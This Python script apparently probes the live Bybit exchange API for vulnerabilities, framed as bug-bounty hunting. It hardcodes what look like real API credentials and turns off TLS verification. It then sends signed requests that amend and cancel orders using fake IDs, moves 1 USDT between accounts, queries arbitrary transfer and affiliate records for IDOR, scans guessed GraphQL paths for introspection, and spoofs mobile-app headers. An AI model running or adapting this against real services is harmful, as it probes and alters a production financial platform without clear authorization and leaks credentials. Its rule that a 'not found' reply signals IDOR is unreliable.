#!/usr/bin/env python3
"""
EXPERT VECTORS HUNT - BYBIT 2025
Focus: Side-effects, IDORs on specific endpoints, GraphQL, Affiliate Logic
Based on verified bounty reports from 2023-2025.
"""
import requests
import time
import hmac
import hashlib
import json
import uuid
import random

API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com"

requests.packages.urllib3.disable_warnings()

def get_signature(params):
    # Use server time offset if needed, but usually syncing is enough
    timestamp = str(int(time.time() * 1000))
    recv_window = "5000"
    
    # Sort params for GET, JSON dump for POST
    if isinstance(params, dict):
        # For GET requests or non-JSON POST bodies (rare in v5)
        param_str = "&".join([f"{k}={v}" for k, v in sorted(params.items())])
    else:
        # For POST JSON payload
        param_str = params
        
    sign_payload = f"{timestamp}{API_KEY}{recv_window}{param_str}"
    signature = hmac.new(bytes(API_SECRET, "utf-8"), bytes(sign_payload, "utf-8"), hashlib.sha256).hexdigest()
    
    return {
        "X-BAPI-API-KEY": API_KEY,
        "X-BAPI-SIGN": signature,
        "X-BAPI-SIGN-TYPE": "2",
        "X-BAPI-TIMESTAMP": timestamp,
        "X-BAPI-RECV-WINDOW": recv_window,
        "Content-Type": "application/json"
    }

print("="*80)
print("🚀 EXPERT VECTORS HUNT: LOGIC & SIDE-EFFECTS")
print("="*80)

# 1. PRIVATE V5 SIDE-EFFECTS (Trading Stop & Order Amend)
# Target: Check if we can interact with arbitrary IDs
print("\n[1] Testing Private V5 Side-Effects (IDOR Probe)")
print("-" * 80)

# Vector A: /v5/position/trading-stop
# We try to modify a non-existent position/order. 
# If return is "Order not found" -> IDOR potential.
# If return is "Access denied" -> Secure.

target_endpoints = [
    ("/v5/position/trading-stop", {
        "category": "linear",
        "symbol": "BTCUSDT",
        "takeProfit": "100000",
        "positionIdx": 0
    }),
    ("/v5/order/amend", {
        "category": "linear",
        "symbol": "BTCUSDT",
        "orderId": str(uuid.uuid4()), # Random UUID
        "qty": "0.1"
    }),
    ("/v5/order/cancel", {
        "category": "linear",
        "symbol": "BTCUSDT",
        "orderId": "11111111-1111-1111-1111-111111111111" # Fake ID
    })
]

for endpoint, payload in target_endpoints:
    payload_str = json.dumps(payload)
    headers = get_signature(payload_str)
    
    try:
        r = requests.post(f"{BASE_URL}{endpoint}", data=payload_str, headers=headers, verify=False)
        print(f"\nEndpoint: {endpoint}")
        print(f"Payload: {payload}")
        print(f"Status: {r.status_code}")
        print(f"Response: {r.text}")
        
        # Analysis
        if "10001" in r.text: # Auth error
            print("  -> Auth failed (Check keys)")
        elif "110001" in r.text or "Order not found" in r.text or "not found" in r.text.lower():
            print("  🚨 INTERESTING: 'Not found' error suggests IDOR potential!")
            print("     It means it checked the DB for this ID, rather than checking ownership first.")
        elif "permission" in r.text.lower() or "access" in r.text.lower():
            print("  -> Secure (Permission denied)")
            
    except Exception as e:
        print(f"  Error: {e}")

# 2. ASSET TRANSFER IDOR
# Target: /v5/asset/transfer/inter-transfer
print("\n\n[2] Testing Asset Transfer IDOR")
print("-" * 80)

transfer_id = str(uuid.uuid4())
payload = {
    "transferId": transfer_id,
    "coin": "USDT",
    "amount": "1",
    "fromAccountType": "UNIFIED",
    "toAccountType": "SPOT"
}

payload_str = json.dumps(payload)
headers = get_signature(payload_str)

try:
    r = requests.post(f"{BASE_URL}/v5/asset/transfer/inter-transfer", data=payload_str, headers=headers, verify=False)
    print(f"Transfer Response: {r.text}")
    
    # Check if we can query a random transfer ID
    # Typically query endpoints use GET parameters
    query_params = {"transferId": str(uuid.uuid4())}
    # Need to generate sign for GET params
    # param_str_get = "&".join([f"{k}={v}" for k, v in sorted(query_params.items())])
    # GET request usually:
    
    r_query = requests.get(f"{BASE_URL}/v5/asset/transfer/query-inter-transfer-list-by-id?transferId={str(uuid.uuid4())}", 
                           headers=get_signature(query_params), verify=False)
    
    print(f"Query Random ID Response: {r_query.text}")
    
except Exception as e:
    print(f"Error: {e}")


# 3. GRAPHQL INTROSPECTION & DISCOVERY
print("\n\n[3] GraphQL Probe")
print("-" * 80)

graphql_paths = [
    "/v5/public/graphql",
    "/graphql",
    "/api/graphql",
    "/v5/graphql",
    "/spot/graphql",
    "/copy-trading/graphql"
]

introspection_query = {
    "query": """
    {
      __schema {
        types {
          name
        }
      }
    }
    """
}

for path in graphql_paths:
    try:
        r = requests.post(f"{BASE_URL}{path}", json=introspection_query, verify=False, timeout=3)
        if r.status_code != 404:
            print(f"Path: {path} -> Status: {r.status_code}")
            if "data" in r.text and "__schema" in r.text:
                print("  🚨 GRAPHQL INTROSPECTION ENABLED!")
                print("     Download schema and look for 'createLoan', 'internalTransfer', 'admin' mutations.")
            else:
                print(f"  Response: {r.text[:100]}")
    except:
        pass

# 4. AFFILIATE INFO LEAK
print("\n\n[4] Affiliate Info Leak (/v5/user/aff-customer-info)")
print("-" * 80)

# Try to get info about arbitrary UID
aff_payload = {"uid": "1"} 
# Often GET request
try:
    # Try GET first
    r_get = requests.get(f"{BASE_URL}/v5/user/aff-customer-info?uid=1", headers=get_signature({"uid": "1"}), verify=False)
    print(f"GET Response: {r_get.text}")
    
    # Try POST
    # Sometimes endpoints accept POST even if documented as GET
    # r_post = requests.post(f"{BASE_URL}/v5/user/aff-customer-info", json=aff_payload, headers=get_signature(json.dumps(aff_payload)), verify=False)
    # print(f"POST Response: {r_post.text}")

except Exception as e:
    print(f"Error: {e}")


# 5. MOBILE-ONLY ENDPOINTS SPOOFING
print("\n\n[5] Mobile Endpoint Spoofing")
print("-" * 80)

# Headers to simulate mobile app
mobile_headers = get_signature("")
mobile_headers.update({
    "User-Agent": "Bybit/4.32.0 (Android 13; Pixel 7 Pro)",
    "platform": "android",
    "X-App-Version": "4.32.0",
    "X-Device-Id": str(uuid.uuid4())
})

try:
    # Try a standard endpoint with mobile headers to see if behavior changes
    r = requests.get(f"{BASE_URL}/v5/user/query-api", headers=mobile_headers, verify=False)
    print(f"Mobile Headers Response: {r.text}")
    
    # Try /app/ prefix (common in mobile)
    r_app = requests.get(f"{BASE_URL}/app/v1/version", verify=False)
    if r_app.status_code != 404:
        print(f"/app/v1/version: {r_app.status_code} - {r_app.text[:100]}")

except Exception as e:
    print(f"Error: {e}")

print("\n" + "="*80)
print("EXPERT HUNT COMPLETE")
print("="*80)
